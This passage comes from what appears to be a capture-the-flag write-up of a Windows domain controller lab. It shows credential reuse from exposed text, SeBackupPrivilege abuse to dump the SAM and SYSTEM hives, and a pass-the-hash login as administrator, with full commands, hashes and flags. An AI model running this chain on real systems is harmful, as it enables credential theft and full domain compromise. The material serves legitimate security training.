john.smoulder                 2024-03-14 08:17:29 2
sarah.dantelia                2024-03-14 08:17:29 2
michael.wrightson             2024-03-14 08:17:29 0
david.orelious                2024-03-14 08:17:29 2        Just in case I forget my password is aRt$Lp#7t*VQ!3          
emily.oscars                  2024-08-22 17:20:17 2
```
- How handy, we've found another pair of credentials: `david.orelious` / `aRt$Lp#7t*VQ!3`
- We can verify with `nxc`:
```sh
❯ nxc smb 10.129.20.238 -u david.orelious -p 'aRt$Lp#7t*VQ!3'
SMB         10.129.20.238   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.20.238   445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
```

- We can go back to `bloodhound` but we don't see anything new, unfortunate

# User Shell - emily.oscars
## DEV Share
---
- We can re-enumerate `SMB` shares to find that `david.orelious` has access to the `DEV` share which contains a potentially juicy file, `Backup_script.ps1`
```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```
- Oh nice, barely have to reverse engineer this one
- We've got another set of creds, `emily.oscars` / `Q!3@Lp#M6b*7t*Vt`

- We can verify the credentials work with `nxc`:
```sh
❯ nxc smb 10.129.20.238 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
SMB         10.129.20.238   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.20.238   445    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt 
```

## Bloodhound Part 2
---
![[Pasted image 20260211201034.png]]
- When we inspect `emily.oscars`, we see that they're a member of the `Backup Operators` group which is a `Tier 0` object
- They've also got remote management! Meaning we've finally got a shell on the box

## Enumeration as emily.oscars
---
- We can grab `user.txt` now:
```sh
❯ evil-winrm -i 10.129.20.238 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> cat user.txt
8b94ee3f386d7dc9494049ead749b6e9
```

- We can perform `whoami /all` to see exactly what privileges we're working with:
```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
- We've got `SeBackupPrivilege`! Meaning we can back up files and directories
- We can abuse this privilege by cloning and reading from privileged files like registry hives to leak high privilege hashes

# Root Shell
## Exploiting SeBackupPrivilege
---
- We can create local copies of the `SAM` and `SECURITY` registries which we'll need in order to leak hashes:
```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save hklm\sam .\sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save hklm\system .\system
The operation completed successfully.
```

- Now we can use `Evil-WinRM` functionality to directly download the files:
```powershell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> download sam
Info: Downloading C:\Users\emily.oscars.CICADA\Documents\sam to sam
Info: Download successful!

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> download system
Info: Downloading C:\Users\emily.oscars.CICADA\Documents\system to system
Info: Download successful!
```

- Now we can use `secretsdump.py` along with the `SAM` and `SYSTEM` registry files to leak their stored hashes:
```sh
❯ secretsdump.py LOCAL -system system -sam sam 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 
```

- We can verify that the `administrator` hash is correct, if it's not we'll need to do a bit more work to leak the Active Directory `NTDS.dit` file
```sh
❯ nxc winrm 10.129.20.238 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
WINRM       10.129.20.238   5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) 
WINRM       10.129.20.238   5985   CICADA-DC        [+] cicada.htb\administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)
```
- Nice! We don't need to do all that garbage, we've got a root shell!

```sh
❯ evil-winrm -i 10.129.20.238 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
2c49af91586d6b92f4cc3675db71f77f
```

